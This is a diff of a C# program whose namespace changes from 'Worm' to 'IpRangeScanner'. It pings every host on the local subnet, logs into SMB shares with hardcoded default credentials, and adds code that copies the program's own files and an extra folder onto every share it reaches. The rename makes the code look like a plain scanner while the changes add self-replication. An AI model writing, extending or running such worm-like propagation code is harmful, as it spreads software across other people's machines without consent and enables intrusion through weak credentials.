@@ -1,18 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Net;
 using System.Net.NetworkInformation;
-using System.Runtime.InteropServices; // Required for P/Invoke
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace Worm
+namespace IpRangeScanner
 {
     class Program
     {
-        // --- P/Invoke definitions for WNetAddConnection2 ---
-        // (This allows us to call a native Windows API function)
-
+        // --- P/Invoke definitions for WNetAddConnection2 & WNetCancelConnection2 ---
         [DllImport("mpr.dll", CharSet = CharSet.Auto)]
         public static extern int WNetAddConnection2(
             [In] NETRESOURCE lpNetResource,
@@ -41,86 +40,208 @@ namespace Worm
 
         // Constants for WNetAddConnection2
         public const int RESOURCETYPE_DISK = 0x1;
-        public const int CONNECT_UPDATE_PROFILE = 0x1;
         public const int NO_ERROR = 0; // Equivalent to ERROR_SUCCESS
 
-        // Error codes from WinError.h (just a few common ones)
+        // Error codes from WinError.h
         public const int ERROR_ACCESS_DENIED = 5;
         public const int ERROR_LOGON_FAILURE = 1326;
         public const int ERROR_INVALID_PASSWORD = 86;
-
+        public const int ERROR_ALREADY_ASSIGNED = 85;
 
         // --- SMB Login Credentials ---
-        const string SmbUsername = "user"; // Replace with your actual SMB username
-        const string SmbPassword = "user"; // Replace with your actual SMB password
-        const string SmbShareName = "share"; // The name of the share you want to try to access (e.g., "VMShare")
+        const string SmbUsername = "user";
+        const string SmbPassword = "user";
+        const string SmbShareName = "SharedFolder"; // The name of the share you want to try to access (e.g., "VMShare")
+
+        // --- Additional Folder to Copy Configuration ---
+        const string AdditionalLocalFolderToInclude = "test";
+
+        // --- Global List for SMB Connection Cleanup ---
+        private static List<string> _activeSmbConnections = new List<string>();
+        private static object _smbConnectionLock = new object();
 
         static async Task Main(string[] args)
         {
-            Console.Title = "Local Network IP & SMB Scanner";
-            Console.WriteLine("Starting IP Range and SMB Scan...");
+            Console.Title = "Local Network IP, SMB Scanner & Self-Deploy (Robust)";
+            Console.WriteLine("Starting IP Range, SMB Scan, and Self-Deployment Test...");
             Console.WriteLine("-----------------------------------");
 
-            string baseIpAddress = GetLocalIpAddress();
-            if (string.IsNullOrEmpty(baseIpAddress))
+            // --- Register Global Cleanup Handlers ---
+            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
+            Console.CancelKeyPress += Console_CancelKeyPress;
+
+            // --- 1. Prepare the Deployment Package (using TemporaryDirectory helper) ---
+            string finalSourceToCopy = null; // Will store the path to the prepared package
+            using (var tempDeploymentPackage = new TemporaryDirectory("IpScannerDeployment")) // Creates and registers for cleanup
             {
-                Console.WriteLine("Could not determine local IP address. Please enter a base IP (e.g., 192.168.1.0):");
-                baseIpAddress = Console.ReadLine();
-            }
+                finalSourceToCopy = tempDeploymentPackage.Path; // Get the path for our operations
 
-            string networkPrefix = GetNetworkPrefix(baseIpAddress);
+                string currentExeDirectory = AppDomain.CurrentDomain.BaseDirectory;
 
-            if (string.IsNullOrEmpty(networkPrefix))
-            {
-                Console.WriteLine("Invalid base IP address. Exiting.");
-                Console.ReadKey();
-                return;
-            }
+                Console.WriteLine($"Preparing deployment package in temporary folder: {finalSourceToCopy}");
 
-            Console.WriteLine($"Scanning network: {networkPrefix}.1 - {networkPrefix}.254 for active hosts and SMB shares.");
-            Console.WriteLine($"Attempting SMB login with Username: '{SmbUsername}', Password: '{SmbPassword}' on share '\\\\<IP>\\{SmbShareName}'");
-            Console.WriteLine("This might take a moment...");
-
-            int maxConcurrentOperations = 50;
-            using (SemaphoreSlim semaphore = new SemaphoreSlim(maxConcurrentOperations))
-            {
-                var tasks = new List<Task>();
-                List<string> activeIps = new List<string>(); // To store active IPs for potential later use if needed
-
-                for (int i = 1; i < 255; i++)
+                try
                 {
-                    string ipToScan = $"{networkPrefix}.{i}";
-
-                    await semaphore.WaitAsync(); // Wait asynchronously for a slot
-
-                    tasks.Add(Task.Run(async () =>
+                    // Copy this program's files into the temporary folder
+                    Console.WriteLine("Copying scanner program files...");
+                    foreach (string file in Directory.GetFiles(currentExeDirectory))
                     {
-                        try
+                        if (!file.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase))
                         {
-                            if (await PingIpAddress(ipToScan))
-                            {
-                                lock (activeIps) // Protect shared list
-                                {
-                                    activeIps.Add(ipToScan);
-                                }
-                                // If ping is successful, attempt SMB connection
-                                await TrySmbConnection(ipToScan);
-                            }
+                            File.Copy(file, Path.Combine(finalSourceToCopy, Path.GetFileName(file)), true);
                         }
-                        finally
-                        {
-                            semaphore.Release(); // Release the semaphore slot
-                        }
-                    }));
+                    }
+
+                    // Check for and copy the additional folder (e.g., "test")
+                    string additionalFolderPath = Path.Combine(currentExeDirectory, AdditionalLocalFolderToInclude);
+                    if (Directory.Exists(additionalFolderPath))
+                    {
+                        Console.WriteLine($"Copying additional folder '{AdditionalLocalFolderToInclude}'...");
+                        CopyDirectoryRecursive(additionalFolderPath, Path.Combine(finalSourceToCopy, AdditionalLocalFolderToInclude));
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Yellow;
+                        Console.WriteLine($"WARNING: Additional folder '{AdditionalLocalFolderToInclude}' not found at '{additionalFolderPath}'. Skipping copy.");
+                        Console.ResetColor();
+                    }
+
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("Deployment package prepared successfully.");
+                    Console.ResetColor();
+                }
+                catch (Exception ex)
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine($"ERROR: Failed to prepare deployment package: {ex.Message}");
+                    Console.ResetColor();
+                    Console.WriteLine("Press any key to exit.");
+                    Console.ReadKey();
+                    return; // Exit if package preparation fails
                 }
 
-                await Task.WhenAll(tasks); // Wait for all tasks to complete asynchronously
-            }
+                Console.WriteLine($"Ready to transfer package from: {finalSourceToCopy}");
 
-            Console.WriteLine("\n-----------------------------------");
-            Console.WriteLine("Scan complete. Press any key to exit.");
+                // --- Rest of the existing SMB scan and transfer logic ---
+                string baseIpAddress = GetLocalIpAddress();
+                if (string.IsNullOrEmpty(baseIpAddress))
+                {
+                    Console.WriteLine("Could not determine local IP address. Please enter a base IP (e.g., 192.168.1.0):");
+                    baseIpAddress = Console.ReadLine();
+                }
+
+                string networkPrefix = GetNetworkPrefix(baseIpAddress);
+
+                if (string.IsNullOrEmpty(networkPrefix))
+                {
+                    Console.WriteLine("Invalid base IP address. Exiting.");
+                    Console.ReadKey();
+                    return;
+                }
+
+                Console.WriteLine($"Scanning network: {networkPrefix}.1 - {networkPrefix}.254 for active hosts and SMB shares.");
+                Console.WriteLine($"Attempting SMB login with Username: '{SmbUsername}', Password: '{SmbPassword}' on share '\\\\<IP>\\{SmbShareName}'");
+                Console.WriteLine("This might take a moment...");
+
+                int maxConcurrentOperations = 50;
+                using (SemaphoreSlim semaphore = new SemaphoreSlim(maxConcurrentOperations))
+                {
+                    var tasks = new List<Task>();
+
+                    for (int i = 1; i < 255; i++)
+                    {
+                        string ipToScan = $"{networkPrefix}.{i}";
+
+                        await semaphore.WaitAsync();
+
+                        tasks.Add(Task.Run(async () =>
+                        {
+                            try
+                            {
+                                if (await PingIpAddress(ipToScan))
+                                {
+                                    await TrySmbConnectionAndTransfer(ipToScan, finalSourceToCopy);
+                                }
+                            }
+                            finally
+                            {
+                                semaphore.Release();
+                            }
+                        }));
+                    }
+
+                    await Task.WhenAll(tasks);
+                }
+
+                Console.WriteLine("\n-----------------------------------");
+                Console.WriteLine("Scan complete.");
+
+            } // TemporaryDirectory's Dispose() is called here, cleaning up the temp folder.
+
+            // --- Unregister Handlers ---
+            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
+            Console.CancelKeyPress -= Console_CancelKeyPress;
+
+            Console.WriteLine("Press any key to exit.");
             Console.ReadKey();
         }
+
+        // --- Global Cleanup Handlers ---
+        private static void CurrentDomain_ProcessExit(object sender, EventArgs e)
+        {
+            Console.WriteLine("Process is exiting. Performing final SMB connection cleanup...");
+            CleanupSmbConnections();
+        }
+
+        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
+        {
+            Console.WriteLine("\nCtrl+C detected. Performing SMB connection cleanup and exiting...");
+            CleanupSmbConnections();
+            e.Cancel = false; // Allow the process to terminate
+        }
+
+        private static void CleanupSmbConnections()
+        {
+            lock (_smbConnectionLock)
+            {
+                foreach (var remotePath in _activeSmbConnections)
+                {
+                    try
+                    {
+                        // WNetCancelConnection2 can block, so run asynchronously if possible,
+                        // but during process exit, we just need to ensure it's done.
+                        WNetCancelConnection2(remotePath, 0, false);
+                        Console.WriteLine($"[CLEANUP] Disconnected from {remotePath}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[CLEANUP ERROR] Failed to disconnect from {remotePath}: {ex.Message}");
+                    }
+                }
+                _activeSmbConnections.Clear();
+            }
+        }
+
+
+        // --- Helper for Recursive Directory Copy ---
+        static void CopyDirectoryRecursive(string sourcePath, string destinationPath)
+        {
+            // Ensure destination exists
+            Directory.CreateDirectory(destinationPath);
+
+            // Create all of the subdirectories
+            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
+            {
+                Directory.CreateDirectory(dirPath.Replace(sourcePath, destinationPath));
+            }
+
+            // Copy all the files
+            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
+            {
+                File.Copy(newPath, newPath.Replace(sourcePath, destinationPath), true);
+            }
+        }
+
 
         static string GetLocalIpAddress()
         {
@@ -157,7 +278,6 @@ namespace Worm
             return null;
         }
 
-        // Modified PingIpAddress to return bool
         static async Task<bool> PingIpAddress(string ipAddress)
         {
             using (Ping pinger = new Ping())
@@ -173,13 +293,11 @@ namespace Worm
                     }
                     else
                     {
-                        // Console.WriteLine($"[INACTIVE] IP: {ipAddress} - Status: {reply.Status}");
                         return false;
                     }
                 }
                 catch (PingException)
                 {
-                    // Console.WriteLine($"[ERROR] IP: {ipAddress} - Ping Exception");
                     return false;
                 }
                 catch (Exception ex)
@@ -190,28 +308,22 @@ namespace Worm
             }
         }
 
-        static async Task TrySmbConnection(string ipAddress)
+        static async Task TrySmbConnectionAndTransfer(string ipAddress, string sourceFolderToCopy)
         {
-            // Note: SMB connection attempts can be slow and may block if a server is unresponsive.
-            // Adjust maxConcurrentOperations accordingly if you experience issues.
-
             string remoteSharePath = $"\\\\{ipAddress}\\{SmbShareName}";
-            string localDriveLetter = null; // We don't need to map a drive, just connect
 
             NETRESOURCE nr = new NETRESOURCE
             {
                 dwType = RESOURCETYPE_DISK,
                 lpRemoteName = remoteSharePath,
-                lpLocalName = localDriveLetter // Can be null for direct connection without drive mapping
+                lpLocalName = null
             };
 
-            int result = -1;
+            int connectionResult = -1;
             try
             {
-                // WNetAddConnection2 can take time if the target is slow or unavailable.
-                // We're wrapping it in Task.Run to keep it off the main async path and allow concurrency.
-                result = await Task.Run(() =>
-                    WNetAddConnection2(nr, SmbPassword, SmbUsername, CONNECT_UPDATE_PROFILE));
+                connectionResult = await Task.Run(() =>
+                    WNetAddConnection2(nr, SmbPassword, SmbUsername, 0));
             }
             catch (Exception ex)
             {
@@ -219,26 +331,54 @@ namespace Worm
                 return;
             }
 
-
-            if (result == NO_ERROR)
+            if (connectionResult == NO_ERROR || connectionResult == ERROR_ALREADY_ASSIGNED)
             {
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine($"[SMB SUCCESS] IP: {ipAddress} - Successfully connected to share '{SmbShareName}'!");
+                Console.WriteLine($"[SMB SUCCESS] IP: {ipAddress} - Connected to share '{SmbShareName}'.");
                 Console.ResetColor();
 
-                // It's good practice to disconnect if we just wanted to check connectivity
-                // WNetCancelConnection2(remoteSharePath, CONNECT_UPDATE_PROFILE, false); // Optional: Disconnect immediately
+                // Register connection for global cleanup IF we established a new one
+                if (connectionResult == NO_ERROR)
+                {
+                    lock (_smbConnectionLock)
+                    {
+                        _activeSmbConnections.Add(remoteSharePath);
+                    }
+                }
+
+                try
+                {
+                    await CopyFolderToSmbShare(sourceFolderToCopy, remoteSharePath);
+                }
+                finally
+                {
+                    // Disconnect after operation (only if we established this specific connection)
+                    if (connectionResult == NO_ERROR)
+                    {
+                        try
+                        {
+                            await Task.Run(() => WNetCancelConnection2(remoteSharePath, 0, false));
+                            lock (_smbConnectionLock)
+                            {
+                                _activeSmbConnections.Remove(remoteSharePath); // Remove from our tracking list
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"[SMB ERROR] IP: {ipAddress} - Error disconnecting from share: {ex.Message}");
+                        }
+                    }
+                }
             }
             else
             {
-                string errorMessage = GetSmbErrorMessage(result);
+                string errorMessage = GetSmbErrorMessage(connectionResult);
                 Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine($"[SMB FAILED] IP: {ipAddress} - Share '{SmbShareName}' - Error Code: {result} ({errorMessage})");
+                Console.WriteLine($"[SMB FAILED] IP: {ipAddress} - Share '{SmbShareName}' - Error Code: {connectionResult} ({errorMessage})");
                 Console.ResetColor();
             }
         }
 
-        // Helper to get a more readable error message for WNet errors
         static string GetSmbErrorMessage(int errorCode)
         {
             switch (errorCode)
@@ -247,10 +387,116 @@ namespace Worm
                 case ERROR_ACCESS_DENIED: return "Access Denied (share permissions or user account issue)";
                 case ERROR_LOGON_FAILURE: return "Logon Failure (incorrect username or password)";
                 case ERROR_INVALID_PASSWORD: return "Invalid Password (for the given username)";
+                case ERROR_ALREADY_ASSIGNED: return "Already Connected (A connection to this remote resource is already present).";
                 case 67: return "Network Name Not Found (share not available or machine name/IP is wrong)";
                 case 53: return "Network Path Not Found (machine not reachable or share doesn't exist)";
                 case 1203: return "No network provider accepted the given network path";
                 default: return $"Unknown Error Code: {errorCode}";
+            }
+        }
+
+        static async Task CopyFolderToSmbShare(string sourceDir, string destinationSharePath)
+        {
+            try
+            {
+                DirectoryInfo sourceDirInfo = new DirectoryInfo(sourceDir);
+                string destinationPath = Path.Combine(destinationSharePath, sourceDirInfo.Name);
+
+                Console.WriteLine($"[TRANSFER] Copying folder '{sourceDirInfo.Name}' (deployment package) to '{destinationPath}'...");
+
+                await Task.Run(() => CopyDirectoryRecursive(sourceDir, destinationPath));
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[TRANSFER SUCCESS] Folder '{sourceDirInfo.Name}' copied successfully to {destinationPath}");
+                Console.ResetColor();
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"[TRANSFER FAILED] Access denied during package transfer. Check permissions on '{destinationSharePath}'. Error: {ex.Message}");
+                Console.ResetColor();
+            }
+            catch (DirectoryNotFoundException ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"[TRANSFER FAILED] Source or destination directory not found during package transfer. Error: {ex.Message}");
+                Console.ResetColor();
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"[TRANSFER FAILED] An error occurred during package folder copy: {ex.Message}");
+                Console.ResetColor();
+            }
+        }
+
+        /// <summary>
+        /// Helper class to manage a temporary directory, ensuring it's cleaned up.
+        /// </summary>
+        class TemporaryDirectory : IDisposable
+        {
+            public string Path { get; private set; }
+            private bool _disposed = false;
+
+            public TemporaryDirectory(string prefix = "TempDir")
+            {
+                Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), $"{prefix}_{Guid.NewGuid().ToString().Substring(0, 8)}");
+                Directory.CreateDirectory(Path);
+
+                // Register for process exit cleanup
+                AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
+            }
+
+            public void Dispose()
+            {
+                Dispose(true);
+                GC.SuppressFinalize(this); // Prevent the finalizer from running
+            }
+
+            protected virtual void Dispose(bool disposing)
+            {
+                if (!_disposed)
+                {
+                    if (disposing)
+                    {
+                        // Remove the process exit handler to avoid double cleanup
+                        AppDomain.CurrentDomain.ProcessExit -= OnProcessExit;
+                        // Clean up managed resources
+                    }
+
+                    // Clean up unmanaged resources (the temp directory)
+                    CleanupTemporaryDirectory();
+                    _disposed = true;
+                }
+            }
+
+            ~TemporaryDirectory()
+            {
+                Dispose(false); // Called by GC if Dispose was not called explicitly
+            }
+
+            private void OnProcessExit(object sender, EventArgs e)
+            {
+                Console.WriteLine($"[CLEANUP] Process exit detected for temp folder: {Path}");
+                CleanupTemporaryDirectory();
+            }
+
+            private void CleanupTemporaryDirectory()
+            {
+                if (Directory.Exists(Path))
+                {
+                    try
+                    {
+                        Console.WriteLine($"[CLEANUP] Deleting temporary directory: {Path}");
+                        Directory.Delete(Path, true); // true for recursive delete
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine($"[CLEANUP ERROR] Failed to delete temporary directory '{Path}': {ex.Message}");
+                        Console.ResetColor();
+                    }
+                }
             }
         }
     }
